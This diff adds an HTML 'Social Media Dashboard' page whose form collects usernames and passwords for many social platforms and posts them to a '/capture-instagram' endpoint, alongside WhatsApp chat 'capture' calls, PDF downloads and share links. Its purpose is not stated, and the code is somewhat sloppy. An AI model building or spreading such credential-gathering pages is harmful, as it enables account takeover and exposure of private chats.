@@ -1,0 +1,569 @@
+<!--<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Data Capture</title>
+</head>
+<body>
+    <h1>Instagram Data Capture</h1>
+    <form action="/capture-instagram" method="post">
+        <label for="username">Instagram Username:</label><br>
+        <input type="text" id="username" name="username" required><br><br>
+        <label for="password">Instagram Password:</label><br>
+        <input type="password" id="password" name="password" required><br><br>
+        <input type="submit" value="Capture Data">
+    </form>
+</body>
+</html>-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Media Dashboard</title>
+    <style>
+      body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    text-align: center;
+    background-color: darkseagreen;
+}
+
+.container {
+    width: 80%;
+    margin: 0 auto;
+}
+
+h1 {
+    margin-top: 20px;
+}
+
+.social-media {
+    display: flex;
+    justify-content: space-around;
+    margin-top: 50px;
+}
+
+.media-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+}
+
+.icon {
+    width: 50px;
+    height: 50px;
+}
+
+.dropdown {
+    margin-top: 10px;
+    position: relative;
+}
+
+.dropbtn {
+    padding: 10px;
+    background-color: #3498db;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+.dropdown-content {
+    display: none;
+    position: absolute;
+    background-color: white;
+    min-width: 160px;
+    box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.2);
+    z-index: 1;
+}
+
+.dropdown-content a {
+    color: black;
+    padding: 12px 16px;
+    text-decoration: none;
+    display: block;
+}
+
+.dropdown-content a:hover {
+    background-color: #f1f1f1;
+}
+
+.dropdown:hover .dropdown-content {
+    display: block;
+}
+
+
+.media-item {
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
+    background-color: #fff;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+}
+
+.icon {
+    width: 50px;
+    height: 50px;
+}
+
+#credentialsForm {
+    margin-top: 50px;
+}
+
+form {
+    display: inline-block;
+    text-align: left;
+}
+
+.actions {
+    margin-top: 30px;
+}
+
+.actions button {
+    padding: 10px 20px;
+    background-color: #2ecc71;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    margin: 0 10px;
+}
+
+.actions button:hover {
+    background-color: #27ae60;
+}
+.share-options {
+    margin-top: 20px;
+    display: flex;
+    justify-content: center;
+}
+
+.share-options a {
+    padding: 10px 15px;
+    margin: 0 10px;
+    background-color: #2980b9;
+    color: white;
+    text-decoration: none;
+    border-radius: 5px;
+}
+
+.share-options a:hover {
+    background-color: #3498db;
+}
+/* Modal Styles */
+/* Modal Styles */
+.modal {
+    display: none;
+    position: fixed;
+    z-index: 1;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background-color: rgb(0,0,0);
+    background-color: rgba(0,0,0,0.4);
+    padding-top: 60px;
+}
+
+.modal-content {
+    background-color: #fefefe;
+    margin: 5% auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 80%;
+    text-align: center;
+}
+
+.close {
+    color: #aaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+    color: black;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+#qrCodeContainer {
+    margin-top: 20px;
+}
+
+#qrCodeDirect {
+    margin-top: 20px;
+    width: 150px;
+    height: 150px;
+}
+
+
+
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.4.0/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+</head>
+<body>
+    <div class="container">
+        <h1>Social Media Dashboard</h1>
+        <div class="social-media">
+          <div class="media-item">
+            <img src="whatsapp.png" alt="WhatsApp" class="icon">
+            <span>WhatsApp</span>
+            <div class="dropdown">
+                <button class="dropbtn">Options</button>
+                <div class="dropdown-content">
+                    <a href="#" id="viewChatList">View chatlist</a>
+                    <a href="#" id="viewProfile">View profile</a>
+                    <a href="#" id="downloadData">Download Data</a>
+                    
+                </div>
+            </div>
+            
+        </div>
+        <div class="media-item">
+            <img src="instagram.png" alt="Instagram" class="icon">
+            <span>Instagram</span>
+            <div class="dropdown">
+                <button class="dropbtn">Options</button>
+                <div class="dropdown-content">
+                    <a href="#" onclick="openCredentialsForm('Instagram')">View Posts</a>
+                    <a href="#" onclick="openCredentialsForm('Instagram')">View Followers</a>
+                    <a href="#" onclick="openCredentialsForm('Instagram')">Download Data</a>
+                </div>
+            </div>
+        </div>
+        <div class="media-item">
+          <img src="facebook.png" alt="Facebook" class="icon">
+          <span>Facebook</span>
+          <div class="dropdown">
+              <button class="dropbtn">Options</button>
+              <div class="dropdown-content">
+                  <a href="#" onclick="openCredentialsForm('Facebook')">View Timeline</a>
+                  <a href="#" onclick="openCredentialsForm('Facebook')">View Friends</a>
+                  <a href="#" onclick="openCredentialsForm('Facebook')">Download Data</a>
+              </div>
+          </div>
+      </div>
+  
+      <div class="media-item">
+          <img src="twitter.png" alt="Twitter" class="icon">
+          <span>Twitter</span>
+          <div class="dropdown">
+              <button class="dropbtn">Options</button>
+              <div class="dropdown-content">
+                  <a href="#" onclick="openCredentialsForm('Twitter')">View Tweets</a>
+                  <a href="#" onclick="openCredentialsForm('Twitter')">View Followers</a>
+                  <a href="#" onclick="openCredentialsForm('Twitter')">Download Data</a>
+              </div>
+          </div>
+      </div>
+            
+
+           
+
+            
+
+            <!-- Add more social media items here -->
+
+            <!-- Telegram -->
+        <div class="media-item">
+          <img src="telegram.png" alt="Telegram" class="icon">
+          <span>Telegram</span>
+          <div class="dropdown">
+              <button class="dropbtn">Options</button>
+              <div class="dropdown-content">
+                  <a href="#" onclick="openCredentialsForm('Telegram')">View Chats</a>
+                  <a href="#" onclick="openCredentialsForm('Telegram')">View Contacts</a>
+                  <a href="#" onclick="openCredentialsForm('Telegram')">Download Data</a>
+              </div>
+          </div>
+      </div>
+
+      <!-- YouTube -->
+      <div class="media-item">
+          <img src="youtube.png" alt="YouTube" class="icon">
+          <span>YouTube</span>
+          <div class="dropdown">
+              <button class="dropbtn">Options</button>
+              <div class="dropdown-content">
+                  <a href="#" onclick="openCredentialsForm('YouTube')">View Channel</a>
+                  <a href="#" onclick="openCredentialsForm('YouTube')">View Subscriptions</a>
+                  <a href="#" onclick="openCredentialsForm('YouTube')">Download Data</a>
+              </div>
+          </div>
+      </div>
+
+      <!-- ShareChat -->
+      <div class="media-item">
+          <img src="sharechat.png" alt="ShareChat" class="icon">
+          <span>ShareChat</span>
+          <div class="dropdown">
+              <button class="dropbtn">Options</button>
+              <div class="dropdown-content">
+                  <a href="#" onclick="openCredentialsForm('ShareChat')">View Posts</a>
+                  <a href="#" onclick="openCredentialsForm('ShareChat')">View Followers</a>
+                  <a href="#" onclick="openCredentialsForm('ShareChat')">Download Data</a>
+              </div>
+          </div>
+      </div>
+
+      <!-- LinkedIn -->
+      <div class="media-item">
+          <img src="linkedin.png" alt="LinkedIn" class="icon">
+          <span>LinkedIn</span>
+          <div class="dropdown">
+              <button class="dropbtn">Options</button>
+              <div class="dropdown-content">
+                  <a href="#" onclick="openCredentialsForm('LinkedIn')">View Profile</a>
+                  <a href="#" onclick="openCredentialsForm('LinkedIn')">View Connections</a>
+                  <a href="#" onclick="openCredentialsForm('LinkedIn')">Download Data</a>
+              </div>
+          </div>
+      </div>
+
+      <!-- Snapchat -->
+      <div class="media-item">
+          <img src="snapchat.png" alt="Snapchat" class="icon">
+          <span>Snapchat</span>
+          <div class="dropdown">
+              <button class="dropbtn">Options</button>
+              <div class="dropdown-content">
+                  <a href="#" onclick="openCredentialsForm('Snapchat')">View Snaps</a>
+                  <a href="#" onclick="openCredentialsForm('Snapchat')">View Friends</a>
+                  <a href="#" onclick="openCredentialsForm('Snapchat')">Download Data</a>
+              </div>
+          </div>
+      </div>
+
+      <!-- TikTok -->
+      <div class="media-item">
+          <img src="tiktok.png" alt="TikTok" class="icon">
+          <span>TikTok</span>
+          <div class="dropdown">
+              <button class="dropbtn">Options</button>
+              <div class="dropdown-content">
+                  <a href="#" onclick="openCredentialsForm('TikTok')">View Videos</a>
+                  <a href="#" onclick="openCredentialsForm('TikTok')">View Followers</a>
+                  <a href="#" onclick="openCredentialsForm('TikTok')">Download Data</a>
+              </div>
+          </div>
+      </div>
+  </div>
+
+
+        </div>
+
+
+        <div id="credentialsForm" style="display: none;">
+          <h3 id="appName"></h3>
+          <form action="/capture-instagram" method="post" id="loginForm">
+              <label for="username">Username:</label>
+              <input type="text" id="username" name="username" required><br><br>
+              <label for="password">Password:</label>
+              <input type="password" id="password" name="password" required><br><br>
+              <button type="submit">Submit</button>
+          </form>
+      </div>
+        <div class="actions">
+          <button id="downloadPdf">Download PDF</button>
+          <button id="sharePdf">Share PDF</button>
+      
+          <div class="share-options">
+              <a id="shareWhatsapp" href="#" target="_blank">Share on WhatsApp</a>
+              <a id="shareTwitter" href="#" target="_blank">Share on Twitter</a>
+              <a id="shareFacebook" href="#" target="_blank">Share on Facebook</a>
+              <a id="shareEmail" href="#" target="_blank">Share via Email</a>
+          </div>
+      </div>
+      
+    </div>
+
+    <script>
+
+
+// Share to WhatsApp
+document.getElementById('shareWhatsapp').addEventListener('click', function () {
+    const url = window.location.href;
+    const message = encodeURIComponent("Check out this Social Media Dashboard: " + url);
+    const whatsappUrl = `https://api.whatsapp.com/send?text=${message}`;
+    this.href = whatsappUrl;
+});
+
+// Share to Twitter
+document.getElementById('shareTwitter').addEventListener('click', function () {
+    const url = window.location.href;
+    const text = encodeURIComponent("Check out this Social Media Dashboard");
+    const twitterUrl = `https://twitter.com/intent/tweet?url=${url}&text=${text}`;
+    this.href = twitterUrl;
+});
+
+// Share to Facebook
+document.getElementById('shareFacebook').addEventListener('click', function () {
+    const url = window.location.href;
+    const facebookUrl = `https://www.facebook.com/sharer/sharer.php?u=${url}`;
+    this.href = facebookUrl;
+});
+
+// Share via Email
+document.getElementById('shareEmail').addEventListener('click', function () {
+    const subject = encodeURIComponent("Check out this Social Media Dashboard");
+    const body = encodeURIComponent("Here is the link to the dashboard: " + window.location.href);
+    const emailUrl = `mailto:?subject=${subject}&body=${body}`;
+    this.href = emailUrl;
+});
+
+// Web Share API (Native Sharing on Mobile Devices)
+document.getElementById('sharePdf').addEventListener('click', function () {
+    if (navigator.share) {
+        navigator.share({
+            title: 'Social Media Dashboard',
+            text: 'Check out this Social Media Dashboard',
+            url: window.location.href
+        }).then(() => {
+            console.log('Thanks for sharing!');
+        }).catch(console.error);
+    } else {
+        alert("Your device doesn't support Web Share API. Use the options below.");
+    }
+});
+
+
+
+document.getElementById('loginForm').addEventListener('submit', async function(event) {
+        event.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        try {
+            const response = await fetch('/capture-instagram', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
+            });
+
+            const result = await response.text();
+            alert(result);
+        } catch (error) {
+            console.error('Error:', error);
+            alert('Failed to capture data.');
+        }
+    });
+
+    
+
+
+document.getElementById('viewProfile').addEventListener('click', function() {
+    fetch('/capture-whatsapp', {
+        method: 'POST'
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log('WhatsApp Capture Success:', data);
+        alert('WhatsApp data captured successfully!');
+    })
+    .catch(error => {
+        console.error('Error capturing WhatsApp data:', error);
+        alert('Failed to capture WhatsApp data.');
+    });
+});
+
+
+
+function openCredentialsForm(appName) {
+    document.getElementById('appName').innerText = `Enter ${appName} Credentials`;
+    document.getElementById('credentialsForm').style.display = 'block';
+}
+function showForm(platform) {
+    const form = document.getElementById('credentialsForm');
+    const formTitle = document.getElementById('formTitle');
+    
+
+    form.style.display = 'none';
+    
+    switch (platform) {
+        case 'facebook':
+            formTitle.textContent = 'Enter Facebook Credentials';
+            form.style.display = 'block';
+            break;
+        case 'twitter':
+            formTitle.textContent = 'Enter Twitter Credentials';
+            form.style.display = 'block';
+            break;
+        case 'instagram':
+            formTitle.textContent = 'Enter Instagram Credentials';
+            form.style.display = 'block';
+            break;
+        
+            
+        default:
+            formTitle.textContent = 'Enter Credentials';
+            form.style.display = 'block';
+    }
+}
+
+document.getElementById('viewChatList').addEventListener('click', function (e) {
+    e.preventDefault();
+    fetch('/capture-whatsapp', {
+        method: 'POST'
+    }).then(response => {
+        if (response.ok) {
+            console.log("WhatsApp Chatlist capture started");
+        } else {
+            console.error("Failed to start the capture process");
+        }
+    }).catch(error => console.error('Error:', error));
+});
+
+
+document.getElementById('downloadPdf').addEventListener('click', () => {
+    window.location.href = '/whatsappchats.pdf';
+});
+
+
+// Handle form submission
+document.getElementById('loginForm').addEventListener('submit', async function(event) {
+    event.preventDefault();
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    try {
+        const response = await fetch('/capture-instagram', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ username, password })
+        });
+
+        const result = await response.text();
+        alert(result);
+
+        // After Instagram data is captured, download the PDF
+        window.location.href = '/captured_data/instagramdata.pdf';
+    } catch (error) {
+        console.error('Error:', error);
+        alert('Failed to capture data.');
+    }
+});
+
+
+
+</script>
+</body></html>
